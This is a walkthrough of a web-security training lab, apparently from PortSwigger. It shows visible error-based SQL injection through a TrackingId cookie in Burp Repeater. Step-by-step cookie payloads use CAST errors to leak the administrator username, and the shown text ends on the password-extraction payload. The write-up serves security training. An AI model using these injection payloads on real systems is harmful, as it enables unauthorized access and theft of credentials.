This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.
I started by exploring the lab using Burp Suite's built-in browser. From **Proxy > HTTP history**, I found a `GET /` request containing a `TrackingId` cookie and sent it to **Repeater** for testing.

I appended a single quote to the cookie value:

```text
TrackingId=ogAZZfxtOKUELbuJ'
```

The response returned a verbose error message that revealed the SQL query and showed that the cookie value was being used inside a single-quoted string. I then added SQL comment characters to comment out the rest of the query:

```text
TrackingId=ogAZZfxtOKUELbuJ'--
```

The error disappeared, indicating that the query was now syntactically valid.

Next, I tested whether I could execute a subquery by using:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

The response indicated that the `AND` condition needed to be a boolean expression, so I modified it to:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

This request was processed without an error, confirming that the query structure was valid.

I then modified the subquery to retrieve usernames from the `users` table:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

The request initially failed because the `TrackingId` value was subject to a character limit, which truncated the comment characters. To avoid this, I removed the original cookie value:

```text
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

This time, the error was generated by the database itself, indicating that the query was being executed but was returning multiple rows. I modified the query to return only the first row:

```text
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

The resulting error leaked the first username from the database:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

Since the first returned user was `administrator`, I changed the subquery to retrieve the password instead:

```text
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
